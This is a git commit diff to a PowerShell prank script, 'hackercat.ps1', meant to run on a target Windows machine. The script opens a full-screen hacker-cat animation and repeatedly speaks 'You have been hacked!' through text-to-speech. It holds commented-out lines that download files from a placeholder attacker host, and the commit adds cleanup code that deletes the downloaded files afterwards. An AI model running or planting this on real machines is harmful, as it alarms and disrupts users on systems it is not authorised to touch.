2cce09ac7ff099680ea0e18d3022cd1eaff572d2
Z3R0th-13 <z3r0th2431@gmail.com>
2018-07-18 11:26:14 -0400

    Update hackercat.ps1
    Added in some cleanup if you host it on the target.

--- hackercat.ps1
+++ hackercat.ps1
@@ -13,15 +13,17 @@
 
 # Credit to Beefycode for the code for text to speech!
 # Will Create a full screen of "Hackercat"
+
+$Destination = "~/documents"
 Function Invoke-Hackercat
 {
     Add-type -AssemblyName System.Windows.Forms
-    start-process "http://giphy.com/gifs/cat-hacker-webs-o0vwzuFwCGAFO/fullscreen" -WindowStyle Maximized
-#    Start-BitsTransfer -Source "http://ENTER_IP_HERE/hax.html" -Destination "hax.html"
-#    Start-BitsTransfer -Source "http://ENTER_IP_HERE/meow.gif" -Destination "meow.gif"
-    start-process "hax.html" -WindowStyle Maximized
-    start-sleep 1
-    [System.Windows.Forms.SendKeys]::SendWait("{F11}")
+    Start-process "http://giphy.com/gifs/cat-hacker-webs-o0vwzuFwCGAFO/fullscreen" -WindowStyle Maximized #This will just grab the gif from Giphy.
+#    Start-BitsTransfer -Source "http://ENTER_IP_HERE/hax.html" -Destination "$Destination/hax.html" #This will download hax.html to the target to be ran locally.
+#    Start-BitsTransfer -Source "http://ENTER_IP_HERE/meow.gif" -Destination "$Destination/meow.gif" #This will download meow.gif to the target to be ran locally.
+#    start-process "$Destination/hax.html" -WindowStyle Maximized #This will start the process for hax.html to induce hackercat in whichever the default internet browser is.
+    Start-sleep 1 
+    [System.Windows.Forms.SendKeys]::SendWait("{F11}") #After waiting, will hit F11 which will fullscreen the browser.
 
     $voice = New-Object -ComObject SAPI.SPVoice
     $voice.Rate = 0
@@ -39,10 +41,13 @@ Function Invoke-Hackercat
  new-alias -name out-voice -value invoke-speech;
  start-sleep 2
  for ($i=1; $i -le 10; $i++ ) {
-    "You have been hacked! Please call your I A M!" | out-voice
-    "Hacker Cat Strikes Again!!!!!" | out-voice
+    "You have been hacked! Please call your I A M!" | out-voice #Change this to whatever you want
+    "Hacker Cat Strikes Again!!!!!" | out-voice #Change this to whatever you want
     }
 
 }
 
-Invoke-Hackercat
+Invoke-Hackercat 
+if (Test-Path "$Destination/hax.html") { rm $Destination/hax.html; Write-Host "Deleted hax.html" } else { Write-Host "Unable to delete file :c" } #Will look for files to cleanup
+if (Test-Path "$Destination/meow.gif") { rm $Destination/meow.gif; Write-Host "Deleted meow.gif" } else { Write-Host "Unable to delete file :c" } #Will look for files to cleanup
+Write-Host "Hackercat has finished!"
